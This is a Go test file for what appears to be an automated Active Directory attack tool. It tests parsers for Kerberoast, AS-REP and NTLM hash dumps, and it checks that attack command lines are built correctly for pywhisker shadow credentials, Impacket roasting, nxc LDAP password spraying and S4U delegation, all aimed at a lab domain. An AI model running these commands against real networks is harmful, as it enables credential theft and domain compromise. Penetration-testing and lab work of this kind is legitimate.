package modules

import (
	"context"
	"reflect"
	"strings"
	"testing"

	"adpack/core"
)

func TestParseKerberoastOutput(t *testing.T) {
	tests := []struct {
		name string
		out  string
		want int
	}{
		{"single TGS hash", "$krb5tgs$23$*user$realm$test/spn$*hashhashhashhashhashhashhas", 1},
		{"no hash in output", "Impacket v0.12.0 - Copyright 2022 Fortra\n\nNo SPNs found!", 0},
		{"mixed stdout noise", "foobarbij$krb5tgs$23$*user$realm$test/spn$*hashhashhashhashhashhashhas", 1},
		{"duplicate hashes", "$krb5tgs$23$*user$realm$test/spn$*hash1\n$krb5tgs$23$*user$realm$test/spn$*hash1", 1},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ParseKerberoastOutput(tt.out)
			if len(got) != tt.want {
				t.Errorf("ParseKerberoastOutput(%q) got %d hashes, want %d", tt.out, len(got), tt.want)
			}
		})
	}
}

func TestParseASREPOutput(t *testing.T) {
	tests := []struct {
		name string
		out  string
		want int
	}{
		{"single AS-REP hash", "$krb5asrep$23$*user@realm$hashhashhashhashhashhashhash", 1},
		{"no hash in output", "Impacket v0.12.0\n[-] User test doesn't have UF_DONT_REQUIRE_PREAUTH set", 0},
		{"duplicate hashes", "$krb5asrep$23$*user1@realm$hash1\n$krb5asrep$23$*user2@realm$hash1", 1},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ParseASREPOutput(tt.out)
			if len(got) != tt.want {
				t.Errorf("ParseASREPOutput(%q) got %d hashes, want %d", tt.out, len(got), tt.want)
			}
		})
	}
}

func TestParseNTLMOutput(t *testing.T) {
	tests := []struct {
		name string
		out  string
		want int
	}{
		{"NTLMSTUB only (empty/unchanged passwords)", "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", 0},
		{"real NTLM hash", "lewis:1001:aad3b435b51404eeaad3b435b51404ee:3f4b4e2b9c8f3a1d2e5f6a7b8c9d0e1f:::", 1},
		{"no hash in output", "Impacket v0.12.0\n[*] Dumping local SAM info\n", 0},
		{"multiple users", "user1:1111:aad3b435b51404eeaad3b435b51404ee:b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4:::\nuser2:1112:aad3b435b51404eeaad3b435b51404ee:4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b:::", 2},
		{"duplicate hashes", "dup1:1111:aad3b435b51404eeaad3b435b51404ee:b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4:::\ndup2:1112:aad3b435b51404eeaad3b435b51404ee:b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4:::", 1},
		{"nxc SMB prefix format", "SMB  192.168.57.22  445  CASTELBLACK  Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::", 1},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ParseNTLMOutput(tt.out)
			if len(got) != tt.want {
				t.Errorf("ParseNTLMOutput(%q) got %d hashes, want %d", tt.out, len(got), tt.want)
			}
		})
	}
}

func TestBuildCommand_ToolShapes(t *testing.T) {
	ctx := context.Background()
	edge := core.PrivilegeEdge{
		SourcePrincipal: "north.sevenkingdoms.local\\samwell.tarly",
		TargetPrincipal: "north.sevenkingdoms.local\\brandon.stark",
		Domain:          "north.sevenkingdoms.local",
	}
	tests := []struct {
		name string
		cap  core.Capability
		want []string
	}{
		{
			name: "pywhisker shadow credentials",
			cap:  core.Capability("SHADOW_CRED"),
			want: []string{"pywhisker", "-d", "north.sevenkingdoms.local", "-u", "samwell.tarly", "-p", "Heartsbane", "--target", "brandon.stark", "--action", "add", "--dc-ip", "192.168.57.11"},
		},
		{
			name: "impacket kerberoast",
			cap:  core.Capability("KERBEROAST"),
			want: []string{"impacket-GetUserSPNs", "north.sevenkingdoms.local/samwell.tarly:Heartsbane", "-request", "-dc-ip", "192.168.57.11"},
		},
		{
			name: "impacket asrep roast single user",
			cap:  core.Capability("ASREP_ROAST"),
			want: []string{"impacket-GetNPUsers", "north.sevenkingdoms.local/samwell.tarly:Heartsbane", "-request", "-dc-ip", "192.168.57.11"},
		},
		{
			name: "nxc ldap spray",
			cap:  core.Capability("LDAP_SPRAY"),
			want: []string{"nxc", "ldap", "192.168.57.11", "-d", "north.sevenkingdoms.local", "-u", "samwell.tarly", "-p", "Heartsbane", "--continue-on-success"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd, cleanup, err := buildCommand(ctx, edge, tt.cap, "north.sevenkingdoms.local", "samwell.tarly", "Heartsbane", "", "192.168.57.11")
			if err != nil {
				t.Fatalf("buildCommand error: %v", err)
			}
			if cleanup != nil {
				defer cleanup()
			}
			if !reflect.DeepEqual(cmd.Args, tt.want) {
				t.Fatalf("args mismatch\n got: %#v\nwant: %#v", cmd.Args, tt.want)
			}
		})
	}
}

func TestBuildCommand_NoInvalidSprayFlag(t *testing.T) {
	ctx := context.Background()
	edge := core.PrivilegeEdge{SourcePrincipal: "u", TargetPrincipal: "v"}
	cmd, cleanup, err := buildCommand(ctx, edge, core.Capability("LDAP_SPRAY"), "d", "u", "p", "", "1.2.3.4")
	if err != nil {
		t.Fatalf("buildCommand error: %v", err)
	}
	if cleanup != nil {
		defer cleanup()
	}
	for _, arg := range cmd.Args {
		if arg == "--spray" {
			t.Fatal("nxc ldap command must not include unsupported --spray flag")
		}
	}
}

func TestBuildCommand_S4USPNNormalizesDomainComputer(t *testing.T) {
	ctx := context.Background()
	edge := core.PrivilegeEdge{
		SourcePrincipal: "north.sevenkingdoms.local\\svc",
		TargetPrincipal: "north.sevenkingdoms.local\\CASTELBLACK$",
	}
	cmd, cleanup, err := buildCommand(ctx, edge, core.Capability("S4U_DELEGATION"), "north.sevenkingdoms.local", "svc", "p", "", "192.168.57.11")
	if err != nil {
		t.Fatalf("buildCommand error: %v", err)
	}
	if cleanup != nil {
		defer cleanup()
	}
	got := strings.Join(cmd.Args, " ")
	if !strings.Contains(got, "cifs/CASTELBLACK.north.sevenkingdoms.local") {
		t.Fatalf("expected normalized CIFS SPN, got %q", got)
	}
}
